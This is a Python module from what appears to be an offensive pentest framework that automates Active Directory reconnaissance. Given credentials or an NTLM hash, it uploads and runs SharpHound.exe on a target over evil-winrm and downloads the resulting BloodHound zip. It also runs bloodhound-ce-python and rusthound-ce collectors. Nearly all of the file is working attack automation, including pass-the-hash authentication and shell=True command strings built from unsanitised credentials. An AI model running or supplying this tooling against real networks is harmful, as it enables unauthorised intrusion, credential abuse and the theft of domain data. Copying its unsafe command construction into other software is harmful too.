import os
import subprocess
from core.paths import get_tool_path

REQUIRES = ["creds"]
PROVIDES = []

def run(data, cred, args):
    method = getattr(args, "method", None)


    if method == "sharphound":
        return run_sharphound(data, cred, args)

    elif method == "python":
        return run_bloodhound_python(data, cred, args)

    elif method == "rusthound":
        return run_rusthound(data, cred, args)

    else:
        print(f"[!] Unsupported method: {method}")
        return data


import os
import subprocess
import re

import os
import re
import subprocess
from core.paths import get_tool_path, get_chain_artifacts_dir


def run_sharphound(data, cred, args):
    import re
    import subprocess
    from pathlib import Path

    ip = data["ip"]
    target = data["name"]

    user = cred.get("user")
    secret = cred.get("secret")
    cred_type = cred.get("type")

    if not user or not secret:
        print("[!] Missing valid credentials")
        return data

    # -------------------
    # Auth Builder
    # -------------------
    if cred_type == "password":
        auth = f"-u {user} -p '{secret}'"

    elif cred_type in ("ntlm", "hash"):
        auth = f"-u {user} -H {secret}"

    else:
        print(f"[!] Unsupported auth type: {cred_type}")
        return data

    # -------------------
    # Setup
    # -------------------
    local_path = get_tool_path("SharpHound.exe")
    filename = "SharpHound.exe"
    prefix = "bloodhound"

    if not local_path.exists():
        print(f"[!] SharpHound not found: {local_path}")
        return data

    out_dir = Path(getattr(args, "out", None) or ".").expanduser().resolve()
    out_dir.mkdir(parents=True, exist_ok=True)

    # -------------------
    # 1. Upload
    # -------------------
    upload_cmd = (
        f'echo "upload {local_path}" | '
        f'evil-winrm -i {ip} {auth}'
    )

    print("[*] Uploading SharpHound...")
    subprocess.run(upload_cmd, shell=True)

    # -------------------
    # 2. Execute
    # -------------------
    exec_cmd = (
        f'echo ".\\{filename} -c All --outputdirectory . '
        f'--outputprefix {prefix}" | '
        f'evil-winrm -i {ip} {auth}'
    )

    print("[*] Running SharpHound...")
    subprocess.run(exec_cmd, shell=True)

    print("[+] Collection complete")

    # -------------------
    # 3. Find ZIP
    # -------------------
    list_cmd = (
        f'echo "dir {prefix}*.zip" | '
        f'evil-winrm -i {ip} {auth}'
    )

    print("[*] Locating output zip...")
    result = subprocess.run(
        list_cmd,
        shell=True,
        capture_output=True,
        text=True
    )

    output = result.stdout + result.stderr

    matches = re.findall(
        rf"({prefix}.*?\.zip)",
        output,
        re.IGNORECASE
    )

    if not matches:
        print("[!] No BloodHound zip found")
        return data

    zipname = matches[-1]
    print(f"[+] Found zip: {zipname}")

    # -------------------
    # 4. Download
    # -------------------
    download_cmd = (
        f'echo "download {zipname}" | '
        f'evil-winrm -i {ip} {auth}'
    )

    print(f"[*] Downloading {zipname}...")

    subprocess.run(
        download_cmd,
        shell=True,
        cwd=out_dir
    )

    # -------------------
    # 5. Verify
    # -------------------
    dest = out_dir / zipname

    if dest.exists():
        print(f"[+] Saved to {dest}")
    else:
        print("[!] Download failed")

    return data



# -------------------
# BLOODHOUND PYTHON (local)
# -------------------
def run_bloodhound_python(data, cred, args):
    target = data["name"]

    user = cred.get("user")
    secret = cred.get("secret")
   
    ip = data.get("ip")
    domain = data.get("domain")

    dc = f"{data.get('hostname')}.{domain}" if data.get("hostname") else ip

    # fallback if hostname is bad
    if not dc or "." not in dc:
        dc = ip

    ns = ip

    from pathlib import Path
    out_dir = Path(getattr(args, "out", None) or ".").expanduser().resolve()
    out_dir.mkdir(parents=True, exist_ok=True)

    cmd = (
        f"bloodhound-ce-python --zip -c All "
        f"-d {domain} "
        f"-u {user} -p {secret} "
        f"-dc {dc} "
        f"-ns {ns}"
    )

    print(f"[*] Running: {cmd}")
    subprocess.run(cmd, shell=True)

    # Move all produced zip files
    for file in os.listdir():
        if file.endswith(".zip"):
            src = Path(file)
            dst = out_dir / file
            src.rename(dst)
            print(f"[+] Saved {file} → {dst}")

    return data


# -------------------
# RUSTHOUND (local)
# -------------------
def run_rusthound(data, cred, args):
    target = data["name"]

    user = cred.get("user")
    secret = cred.get("secret")
    domain = data.get("domain")

    from pathlib import Path
    out_dir = Path(getattr(args, "out", None) or ".").expanduser().resolve()
    out_dir.mkdir(parents=True, exist_ok=True)

    cmd = (
        f"rusthound-ce "
        f"-u {user} -p {secret} "
        f"-d {domain} -z"
    )

    print(f"[*] Running: {cmd}")
    subprocess.run(cmd, shell=True)

    # Move output zip(s)
    for file in os.listdir():
        if file.endswith(".zip"):
            src = Path(file)
            dst = out_dir / file
            src.rename(dst)
            print(f"[+] Saved {file} → {dst}")

    return data




